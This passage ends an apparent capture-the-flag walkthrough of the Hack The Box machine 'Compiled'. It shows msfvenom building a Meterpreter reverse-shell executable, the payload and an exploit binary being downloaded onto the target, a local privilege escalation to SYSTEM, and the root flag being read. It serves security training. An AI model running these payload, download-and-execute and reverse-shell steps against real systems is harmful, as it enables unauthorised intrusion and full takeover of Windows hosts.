+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=4455 -f exe &gt; aaa.exe   </span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No <span class="built_in">arch</span> selected, selecting <span class="built_in">arch</span>: x86 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 354 bytes</span><br><span class="line">Final size of exe file: 73802 bytes</span><br><span class="line">                                                                                                                    </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ python3 -m http.server 80</span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span><br><span class="line">10.129.253.115 - - [13/Dec/2024 18:09:35] <span class="string">&quot;GET /aaa.exe HTTP/1.1&quot;</span> 200 -</span><br><span class="line">10.129.253.115 - - [13/Dec/2024 18:09:39] <span class="string">&quot;GET /Expl.exe HTTP/1.1&quot;</span> 200 -</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">PS C:\tmp&gt; iwr 10.10.x.x/aaa.exe -outfile aaa.exe</span><br><span class="line">iwr 10.10.x.x/aaa.exe -outfile aaa.exe</span><br><span class="line">PS C:\tmp&gt; iwr 10.10.x.x/Expl.exe -outfile Expl.exe</span><br><span class="line">iwr 10.10.x.x/Expl.exe -outfile Expl.exe</span><br><span class="line">PS C:\tmp&gt; <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name                                                                 </span><br><span class="line">----                 -------------         ------ ----                                                                 </span><br><span class="line">-a----        12/13/2024   6:15 PM          73802 aaa.exe                                                              </span><br><span class="line">-a----        12/13/2024   6:15 PM         171008 Expl.exe                                                             </span><br><span class="line">-a----        12/13/2024   5:15 PM          51712 r.exe                                                                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\tmp&gt; ./r.exe emily 12345678 <span class="string">&quot;c:/tmp/Expl.exe&quot;</span></span><br><span class="line">./r.exe emily 12345678 <span class="string">&quot;c:/tmp/Expl.exe&quot;</span></span><br><span class="line"></span><br><span class="line">[+] Junction \\?\C:\580c1976-923c-40e4-8279-1ce253ae3e99 -&gt; \??\C:\cb8342cd-d86c-4883-bc0a-5686b8bc8cef created!</span><br><span class="line">[+] Symlink Global\GLOBALROOT\RPC Control\Report.0197E42F-003D-4F91-A845-6404CF289E84.diagsession -&gt; \??\C:\Programdata created!</span><br><span class="line">[+] Junction \\?\C:\580c1976-923c-40e4-8279-1ce253ae3e99 -&gt; \RPC Control created!</span><br><span class="line">[+] Junction \\?\C:\580c1976-923c-40e4-8279-1ce253ae3e99 -&gt; \??\C:\cb8342cd-d86c-4883-bc0a-5686b8bc8cef created!</span><br><span class="line">[+] Symlink Global\GLOBALROOT\RPC Control\Report.0297E42F-003D-4F91-A845-6404CF289E84.diagsession -&gt; \??\C:\Programdata\Microsoft created!</span><br><span class="line">[+] Junction \\?\C:\580c1976-923c-40e4-8279-1ce253ae3e99 -&gt; \RPC Control created!</span><br><span class="line">[+] Persmissions successfully reseted!</span><br><span class="line">[*] Starting WMI installer.</span><br><span class="line">[*] Command to execute: C:\windows\system32\msiexec.exe /fa C:\windows\installer\8ad86.msi</span><br><span class="line">[*] Oplock!</span><br><span class="line">[+] File moved!</span><br><span class="line">PS C:\tmp&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>And we are in!</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.x.x:4455 </span><br><span class="line">[*] Sending stage (177734 bytes) to 10.129.253.115</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.x.x:4455 -&gt; 10.129.253.115:54603) at 2024-12-13 18:10:39 +0100</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; <span class="built_in">cat</span> <span class="string">&quot;c:/users/administrator/desktop/root.txt&quot;</span></span><br><span class="line">dfa95100a5e25f******************</span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>That was it for Compiled, hope you learned a thing or two :)<br>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: Compiled</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2024-12-13 15:33:35</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-12-13 18:21:03
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2024/12/13/Hackthebox-Compiled/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/12/06/Hackthebox-GreenHorn/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: GreenHorn</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: Compiled</div>
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Application-http-10-129-253-115-5000"><span class="nav-text">Web Application - http:&#x2F;&#x2F;10.129.253.115:5000 </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Application-http-10-129-253-115-3000"><span class="nav-text">Web Application - http:&#x2F;&#x2F;10.129.253.115:3000 </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2024-32002-Richard"><span class="nav-text">CVE-2024-32002 - Richard</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-Escalation-to-NT-Authority-System-CVE-2024-20656"><span class="nav-text">Privilege Escalation to NT Authority\System - CVE-2024-20656</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
